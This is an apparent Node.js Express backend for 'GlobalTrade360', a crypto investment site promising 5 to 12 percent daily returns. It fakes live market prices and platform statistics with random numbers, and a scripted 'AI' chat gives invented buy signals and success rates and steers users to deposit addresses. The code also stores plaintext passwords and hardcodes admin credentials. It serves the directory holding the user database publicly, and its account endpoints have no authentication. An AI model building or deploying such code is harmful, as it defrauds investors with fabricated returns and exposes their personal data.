const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('.')); // Serve static files from root

// Database file path
const DB_FILE = path.join(__dirname, 'users.json');

// Initialize database
function initializeDatabase() {
    if (!fs.existsSync(DB_FILE)) {
        const initialData = {
            users: [
                {
                    id: 1001,
                    name: "Test User",
                    email: "test@example.com",
                    username: "testuser",
                    password: "Test123!",
                    phone: "+1234567890",
                    balance: 1500.00,
                    totalDeposited: 2000.00,
                    totalWithdrawn: 500.00,
                    investments: [
                        {
                            id: 1,
                            plan: "Professional",
                            amount: 1000,
                            dailyRate: 8.5,
                            duration: 45,
                            startDate: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString(),
                            endDate: new Date(Date.now() + 35 * 24 * 60 * 60 * 1000).toISOString(),
                            active: true,
                            totalProfit: 425.00
                        }
                    ],
                    transactions: [],
                    joined: new Date().toISOString(),
                    verified: true,
                    kycStatus: "approved",
                    lastLogin: null
                }
            ],
            admin: {
                username: process.env.ADMIN_USERNAME || "globaltrade360",
                password: process.env.ADMIN_PASSWORD || "myhandwork2025",
                email: process.env.ADMIN_EMAIL || "stevenlogan362@gmail.com",
                fullName: "Steven Logan",
                lastLogin: null
            },
            cryptoAddresses: {
                bitcoin: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
                ethereum: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
                usdt: "TNS1V6WVLkQRL2VQGP1C7nKFQZ0Gq9Zq1e",
                updatedAt: new Date().toISOString(),
                updatedBy: "system"
            },
            platformStats: {
                totalUsers: 1,
                activeUsers: 1,
                totalInvestments: 1,
                totalVolume: 1000.00,
                totalProfitPaid: 425.00,
                successRate: 98.7,
                updatedAt: new Date().toISOString()
            },
            messages: [],
            siteTransactions: [],
            investmentPlans: [
                {
                    name: "Basic",
                    dailyRate: 5,
                    duration: 30,
                    minAmount: 100,
                    maxAmount: 1000,
                    features: ["Capital Return", "24/7 Support"]
                },
                {
                    name: "Professional",
                    dailyRate: 8.5,
                    duration: 45,
                    minAmount: 1000,
                    maxAmount: 10000,
                    features: ["Capital Return", "Priority Support", "AI Signals Access"]
                },
                {
                    name: "VIP",
                    dailyRate: 12,
                    duration: 60,
                    minAmount: 10000,
                    maxAmount: 100000,
                    features: ["Capital Return", "Personal Manager", "Advanced AI Tools"]
                }
            ],
            liveMarketData: {
                btc: { price: 45218.50, change: 2.3 },
                eth: { price: 2415.75, change: 1.8 },
                xrp: { price: 0.6245, change: -0.5 },
                eur_usd: { price: 1.0850, change: 0.2 },
                gbp_usd: { price: 1.2650, change: 0.1 },
                gold: { price: 2034.50, change: 0.8 },
                updatedAt: new Date().toISOString()
            }
        };
        
        fs.writeFileSync(DB_FILE, JSON.stringify(initialData, null, 2));
        console.log("Database initialized with test data");
    }
}

// Read database
function readDB() {
    try {
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error("Error reading database:", error);
        initializeDatabase();
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    }
}

// Write to database
function writeDB(data) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
        return true;
    } catch (error) {
        console.error("Error writing to database:", error);
        return false;
    }
}

// Email transporter setup
let transporter;
if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
    transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS
        }
    });
    console.log("Email transporter configured");
} else {
    console.log("Email configuration missing. Emails will not be sent.");
}

// Helper function to send email
async function sendEmail(to, subject, html) {
    if (!transporter) {
        console.log("Email not sent (transporter not configured):", { to, subject });
        return false;
    }
    
    try {
        const mailOptions = {
            from: `"GlobalTrade360" <${process.env.EMAIL_USER}>`,
            to: to,
            subject: subject,
            html: html
        };
        
        await transporter.sendMail(mailOptions);
        console.log(`Email sent to ${to}`);
        return true;
    } catch (error) {
        console.error("Email sending error:", error);
        return false;
    }
}

// Routes

// Serve main HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Get market data
app.get('/api/market-data', (req, res) => {
    const db = readDB();
    
    // Update prices randomly
    Object.keys(db.liveMarketData).forEach(key => {
        if (key !== 'updatedAt') {
            const change = (Math.random() - 0.5) * 0.5;
            db.liveMarketData[key].price += db.liveMarketData[key].price * change / 100;
            db.liveMarketData[key].change += change;
            db.liveMarketData[key].price = parseFloat(db.liveMarketData[key].price.toFixed(2));
            db.liveMarketData[key].change = parseFloat(db.liveMarketData[key].change.toFixed(2));
        }
    });
    db.liveMarketData.updatedAt = new Date().toISOString();
    writeDB(db);
    
    res.json(db.liveMarketData);
});

// User registration
app.post('/api/register', async (req, res) => {
    const { name, email, username, password, phone } = req.body;
    const db = readDB();
    
    // Validation
    if (!name || !email || !username || !password) {
        return res.status(400).json({ error: 'All fields are required' });
    }
    
    // Check if user exists
    if (db.users.some(u => u.email === email)) {
        return res.status(400).json({ error: 'Email already registered' });
    }
    if (db.users.some(u => u.username === username)) {
        return res.status(400).json({ error: 'Username already taken' });
    }
    
    // Create new user
    const newUser = {
        id: Date.now(),
        name,
        email,
        username,
        password, // In production, hash this!
        phone: phone || '',
        balance: 50.00, // Welcome bonus
        totalDeposited: 0,
        totalWithdrawn: 0,
        investments: [],
        transactions: [],
        joined: new Date().toISOString(),
        verified: false,
        kycStatus: 'pending',
        lastLogin: null
    };
    
    db.users.push(newUser);
    db.platformStats.totalUsers = db.users.length;
    db.platformStats.activeUsers = db.users.filter(u => u.lastLogin && Date.now() - new Date(u.lastLogin).getTime() < 30 * 24 * 60 * 60 * 1000).length;
    db.platformStats.updatedAt = new Date().toISOString();
    
    writeDB(db);
    
    // Send welcome email
    await sendEmail(email, 
        'Welcome to GlobalTrade360 - Your Investment Journey Begins!',
        `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #FFD700;">Welcome to GlobalTrade360, ${name}!</h2>
            <p>Your account has been successfully created.</p>
            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                <h3 style="color: #28a745;">🎁 $50 Welcome Bonus Added!</h3>
                <p>Your account has been credited with $50 to start your investment journey.</p>
            </div>
            <p><strong>Account Details:</strong></p>
            <ul>
                <li>Username: ${username}</li>
                <li>Email: ${email}</li>
                <li>Account Balance: $50.00</li>
            </ul>
            <p>Start investing now by visiting: <a href="${req.headers.origin}">GlobalTrade360 Platform</a></p>
            <p>For security, never share your login credentials.</p>
            <br>
            <p>Best regards,<br>
            <strong>GlobalTrade360 Team</strong><br>
            Email: support@globaltrade360.com</p>
        </div>
        `
    );
    
    res.json({ 
        success: true, 
        message: 'Registration successful! $50 bonus added.',
        user: { 
            id: newUser.id, 
            name: newUser.name, 
            email: newUser.email, 
            username: newUser.username,
            balance: newUser.balance 
        }
    });
});

// User login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const db = readDB();
    
    // Check admin login
    if (username === db.admin.username && password === db.admin.password) {
        db.admin.lastLogin = new Date().toISOString();
        writeDB(db);
        
        return res.json({
            success: true,
            isAdmin: true,
            user: {
                username: db.admin.username,
                email: db.admin.email,
                fullName: db.admin.fullName
            }
        });
    }
    
    // Check user login
    const user = db.users.find(u => 
        (u.username === username || u.email === username) && 
        u.password === password
    );
    
    if (user) {
        // Update last login
        user.lastLogin = new Date().toISOString();
        writeDB(db);
        
        res.json({
            success: true,
            isAdmin: false,
            user: {
                id: user.id,
                name: user.name,
                email: user.email,
                username: user.username,
                balance: user.balance,
                investments: user.investments
            }
        });
    } else {
        res.status(401).json({ 
            success: false, 
            error: 'Invalid username/email or password' 
        });
    }
});

// Get user data
app.get('/api/user/:id', (req, res) => {
    const db = readDB();
    const user = db.users.find(u => u.id == req.params.id);
    
    if (user) {
        // Calculate real-time profits
        user.investments.forEach(inv => {
            if (inv.active) {
                const daysActive = Math.floor((Date.now() - new Date(inv.startDate).getTime()) / (1000 * 60 * 60 * 24));
                inv.currentProfit = inv.amount * (inv.dailyRate / 100) * daysActive;
            }
        });
        
        res.json({ 
            success: true, 
            user: { 
                ...user, 
                password: undefined 
            } 
        });
    } else {
        res.status(404).json({ 
            success: false, 
            error: 'User not found' 
        });
    }
});

// Update user balance
app.post('/api/user/:id/deposit', async (req, res) => {
    const { amount, cryptoType } = req.body;
    const db = readDB();
    const userIndex = db.users.findIndex(u => u.id == req.params.id);
    
    if (userIndex === -1) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    const depositAmount = parseFloat(amount);
    if (isNaN(depositAmount) || depositAmount < 100) {
        return res.status(400).json({ error: 'Minimum deposit is $100' });
    }
    
    // Update user balance
    db.users[userIndex].balance += depositAmount;
    db.users[userIndex].totalDeposited += depositAmount;
    
    // Add transaction record
    const transaction = {
        id: Date.now(),
        userId: req.params.id,
        type: 'deposit',
        amount: depositAmount,
        currency: 'USD',
        cryptoType: cryptoType,
        status: 'pending',
        date: new Date().toISOString()
    };
    
    db.users[userIndex].transactions.push(transaction);
    db.siteTransactions.push(transaction);
    
    // Update platform stats
    db.platformStats.totalVolume += depositAmount;
    db.platformStats.updatedAt = new Date().toISOString();
    
    writeDB(db);
    
    // Send deposit confirmation email
    await sendEmail(db.users[userIndex].email,
        'Deposit Request Received - GlobalTrade360',
        `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #FFD700;">Deposit Request Received</h2>
            <p>Hello ${db.users[userIndex].name},</p>
            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                <h3>Deposit Details</h3>
                <p><strong>Amount:</strong> $${depositAmount}</p>
                <p><strong>Crypto Type:</strong> ${cryptoType}</p>
                <p><strong>Status:</strong> Pending Confirmation</p>
                <p><strong>Transaction ID:</strong> ${transaction.id}</p>
            </div>
            <p>Please send $${depositAmount} worth of ${cryptoType} to:</p>
            <div style="background: #e9ecef; padding: 15px; border-radius: 5px; margin: 15px 0; font-family: monospace;">
                ${db.cryptoAddresses[cryptoType.toLowerCase()]}
            </div>
            <p>Your funds will be available after 3 network confirmations.</p>
            <br>
            <p>Best regards,<br>
            <strong>GlobalTrade360 Team</strong></p>
        </div>
        `
    );
    
    res.json({ 
        success: true, 
        message: 'Deposit request received',
        balance: db.users[userIndex].balance,
        cryptoAddress: db.cryptoAddresses[cryptoType.toLowerCase()],
        transactionId: transaction.id
    });
});

// Withdraw request
app.post('/api/user/:id/withdraw', async (req, res) => {
    const { amount, walletAddress } = req.body;
    const db = readDB();
    const userIndex = db.users.findIndex(u => u.id == req.params.id);
    
    if (userIndex === -1) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    const withdrawAmount = parseFloat(amount);
    if (isNaN(withdrawAmount) || withdrawAmount < 50) {
        return res.status(400).json({ error: 'Minimum withdrawal is $50' });
    }
    
    if (db.users[userIndex].balance < withdrawAmount) {
        return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    // Update user balance
    db.users[userIndex].balance -= withdrawAmount;
    db.users[userIndex].totalWithdrawn += withdrawAmount;
    
    // Add transaction record
    const transaction = {
        id: Date.now(),
        userId: req.params.id,
        type: 'withdrawal',
        amount: withdrawAmount,
        currency: 'USD',
        walletAddress: walletAddress,
        status: 'pending',
        date: new Date().toISOString()
    };
    
    db.users[userIndex].transactions.push(transaction);
    db.siteTransactions.push(transaction);
    db.platformStats.totalProfitPaid += withdrawAmount;
    db.platformStats.updatedAt = new Date().toISOString();
    
    writeDB(db);
    
    // Send withdrawal confirmation email
    await sendEmail(db.users[userIndex].email,
        'Withdrawal Request Received - GlobalTrade360',
        `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #FFD700;">Withdrawal Request Received</h2>
            <p>Hello ${db.users[userIndex].name},</p>
            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                <h3>Withdrawal Details</h3>
                <p><strong>Amount:</strong> $${withdrawAmount}</p>
                <p><strong>Wallet Address:</strong> ${walletAddress.substring(0, 20)}...</p>
                <p><strong>Status:</strong> Processing</p>
                <p><strong>Transaction ID:</strong> ${transaction.id}</p>
            </div>
            <p>Your withdrawal will be processed within 2-24 hours.</p>
            <p>You will receive a confirmation email once completed.</p>
            <br>
            <p>Best regards,<br>
            <strong>GlobalTrade360 Team</strong></p>
        </div>
        `
    );
    
    // Notify admin
    await sendEmail(db.admin.email,
        `Withdrawal Request - $${withdrawAmount} - User: ${db.users[userIndex].username}`,
        `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #dc3545;">New Withdrawal Request</h2>
            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                <h3>Request Details</h3>
                <p><strong>User:</strong> ${db.users[userIndex].name} (${db.users[userIndex].username})</p>
                <p><strong>Amount:</strong> $${withdrawAmount}</p>
                <p><strong>User Balance After:</strong> $${db.users[userIndex].balance}</p>
                <p><strong>Wallet Address:</strong> ${walletAddress}</p>
                <p><strong>Transaction ID:</strong> ${transaction.id}</p>
                <p><strong>Date:</strong> ${new Date().toLocaleString()}</p>
            </div>
        </div>
        `
    );
    
    res.json({ 
        success: true, 
        message: 'Withdrawal request submitted',
        balance: db.users[userIndex].balance,
        transactionId: transaction.id
    });
});

// Create investment
app.post('/api/user/:id/invest', (req, res) => {
    const { plan, amount } = req.body;
    const db = readDB();
    const userIndex = db.users.findIndex(u => u.id == req.params.id);
    
    if (userIndex === -1) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    const investmentAmount = parseFloat(amount);
    if (db.users[userIndex].balance < investmentAmount) {
        return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    // Get plan details
    const planDetails = db.investmentPlans.find(p => p.name.toLowerCase() === plan.toLowerCase());
    if (!planDetails) {
        return res.status(400).json({ error: 'Invalid investment plan' });
    }
    
    if (investmentAmount < planDetails.minAmount) {
        return res.status(400).json({ error: `Minimum amount for ${plan} plan is $${planDetails.minAmount}` });
    }
    
    if (investmentAmount > planDetails.maxAmount) {
        return res.status(400).json({ error: `Maximum amount for ${plan} plan is $${planDetails.maxAmount}` });
    }
    
    // Deduct amount from balance
    db.users[userIndex].balance -= investmentAmount;
    
    // Create investment
    const investment = {
        id: Date.now(),
        plan: planDetails.name,
        amount: investmentAmount,
        dailyRate: planDetails.dailyRate,
        duration: planDetails.duration,
        startDate: new Date().toISOString(),
        endDate: new Date(Date.now() + planDetails.duration * 24 * 60 * 60 * 1000).toISOString(),
        active: true,
        totalProfit: 0
    };
    
    db.users[userIndex].investments.push(investment);
    
    // Update platform stats
    db.platformStats.totalInvestments++;
    db.platformStats.updatedAt = new Date().toISOString();
    
    writeDB(db);
    
    res.json({ 
        success: true, 
        message: `Investment created successfully in ${plan} plan`,
        investment: investment,
        newBalance: db.users[userIndex].balance
    });
});

// Get crypto addresses
app.get('/api/crypto-addresses', (req, res) => {
    const db = readDB();
    res.json(db.cryptoAddresses);
});

// Update crypto addresses (admin only)
app.post('/api/admin/update-crypto', (req, res) => {
    const { bitcoin, ethereum, usdt, adminKey } = req.body;
    
    if (adminKey !== 'myhandwork2025') {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    
    const db = readDB();
    db.cryptoAddresses.bitcoin = bitcoin;
    db.cryptoAddresses.ethereum = ethereum;
    db.cryptoAddresses.usdt = usdt;
    db.cryptoAddresses.updatedAt = new Date().toISOString();
    db.cryptoAddresses.updatedBy = 'admin';
    
    writeDB(db);
    
    res.json({ 
        success: true, 
        message: 'Crypto addresses updated successfully',
        addresses: db.cryptoAddresses
    });
});

// Get platform statistics
app.get('/api/platform-stats', (req, res) => {
    const db = readDB();
    
    // Simulate live updates
    db.platformStats.totalVolume += Math.random() * 1000;
    db.platformStats.totalProfitPaid += Math.random() * 500;
    writeDB(db);
    
    res.json(db.platformStats);
});

// AI Chat endpoint
app.post('/api/ai-chat', (req, res) => {
    const { message, userId } = req.body;
    const db = readDB();
    
    const responses = {
        deposit: `Use these deposit addresses:<br>
        <strong>Bitcoin:</strong> ${db.cryptoAddresses.bitcoin}<br>
        <strong>Ethereum:</strong> ${db.cryptoAddresses.ethereum}<br>
        <strong>USDT:</strong> ${db.cryptoAddresses.usdt}<br>
        Minimum deposit: $100`,
        
        profit: 'Current market analysis suggests bullish trends in major cryptocurrencies. Professional plan (8.5% daily) is recommended for optimal returns.',
        
        withdraw: 'Withdrawals processed in 2-24 hours. Minimum: $50. Ensure your wallet address is correct.',
        
        support: 'Contact support: support@globaltrade360.com. Include your username for faster assistance.',
        
        bitcoin: 'BTC analysis: Strong buy signal. Target: $55,000. Current accumulation phase presents good entry points.',
        
        default: 'I recommend our automated trading algorithms with 94.2% success rate. Which market interests you: Crypto or Forex?'
    };
    
    let response = responses.default;
    const msg = message.toLowerCase();
    
    if (msg.includes('deposit') || msg.includes('pay')) response = responses.deposit;
    else if (msg.includes('profit') || msg.includes('earn')) response = responses.profit;
    else if (msg.includes('withdraw') || msg.includes('cash out')) response = responses.withdraw;
    else if (msg.includes('support') || msg.includes('help')) response = responses.support;
    else if (msg.includes('bitcoin') || msg.includes('btc')) response = responses.bitcoin;
    
    // Store message
    const chatMessage = {
        id: Date.now(),
        userId: userId,
        message: message,
        response: response,
        timestamp: new Date().toISOString()
    };
    
    db.messages.push(chatMessage);
    writeDB(db);
    
    res.json({ 
        success: true, 
        response: response 
    });
});

// Admin endpoints
app.get('/api/admin/users', (req, res) => {
    const { adminKey } = req.query;
    
    if (adminKey !== 'myhandwork2025') {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    
    const db = readDB();
    const users = db.users.map(u => ({
        id: u.id,
        name: u.name,
        email: u.email,
        username: u.username,
        balance: u.balance,
        totalDeposited: u.totalDeposited,
        totalWithdrawn: u.totalWithdrawn,
        investments: u.investments.length,
        joined: u.joined,
        lastLogin: u.lastLogin
    }));
    
    res.json({ 
        success: true, 
        users: users,
        total: users.length 
    });
});

app.post('/api/admin/broadcast', async (req, res) => {
    const { subject, message, adminKey } = req.body;
    
    if (adminKey !== 'myhandwork2025') {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    
    const db = readDB();
    const emails = db.users.map(u => u.email);
    
    // Send to each user
    const sendPromises = emails.map(email => 
        sendEmail(email, subject, 
            `<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                <h2 style="color: #FFD700;">${subject}</h2>
                <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                    ${message.replace(/\n/g, '<br>')}
                </div>
                <p><em>This is an important announcement from GlobalTrade360.</em></p>
                <br>
                <p>Best regards,<br>
                <strong>GlobalTrade360 Team</strong><br>
                support@globaltrade360.com</p>
            </div>`
        )
    );
    
    await Promise.all(sendPromises);
    
    res.json({ 
        success: true, 
        message: `Broadcast sent to ${emails.length} users` 
    });
});

// Serve static files
app.use(express.static(__dirname));

// Initialize and start server
initializeDatabase();
app.listen(PORT, () => {
    console.log(`🚀 GlobalTrade360 Platform running on port ${PORT}`);
    console.log(`🌐 Open http://localhost:${PORT} in your browser`);
    console.log(`🔐 Admin login: globaltrade360 / myhandwork2025`);
    console.log(`👤 Test user: testuser / Test123!`);
    console.log(`📧 Support email: ${process.env.ADMIN_EMAIL || 'stevenlogan362@gmail.com'}`);
});
